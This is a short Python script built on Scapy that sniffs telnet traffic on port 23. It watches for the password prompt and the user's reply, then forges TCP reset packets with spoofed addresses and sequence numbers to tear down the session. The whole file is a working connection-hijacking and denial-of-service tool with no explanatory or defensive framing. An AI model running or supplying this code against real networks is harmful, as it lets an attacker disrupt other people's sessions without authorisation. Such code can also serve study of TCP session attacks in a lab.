from scapy.all import *

def hijackResponse(p):
    sMAC = p[Ether].dst
    dMAC = p[Ether].src
    sIP = p[IP].dst
    dIP = p[IP].src
    sport = p[TCP].dport
    ack = p[TCP].seq+1
    seq = p[TCP].ack
    r = Ether(src=sMAC,dst=dMAC)/IP(src=sIP,dst=dIP)/TCP(sport=sport,dport=23,seq=seq,ack=ack,flags="R",options=p[TCP].options)
    sendp(r)

telnetConns = {}
def monitorConnections(p):
    if p[TCP].dport == 23:
        sIP = p[IP].dst
        cIP = p[IP].src
        port = p[TCP].sport
        key = "%s->%s" % (cIP,sIP)
        if not key in telnetConns:
            telnetConns[key] = {}
        if port in telnetConns[key]:
            if p.haslayer(Raw) and p[Raw].load == b"\r\n":
                if telnetConns[key][port] == "p":
                    telnetConns[key][port] = "pass"
    else:
        sIP = p[IP].src
        cIP = p[IP].dst
        port = p[TCP].dport
        key = "%s->%s" % (cIP,sIP)
        if not key in telnetConns:
            telnetConns[key] = {}
        if port in telnetConns[key] and telnetConns[key][port] == "pass":
            hijackResponse(p)
            telnetConns[key][port] = "terminated"
        elif p.haslayer(Raw):
            if b"Password" in p[Raw].load:
                telnetConns[key][port] = "p"



sniff(filter="tcp port 23",prn=monitorConnections)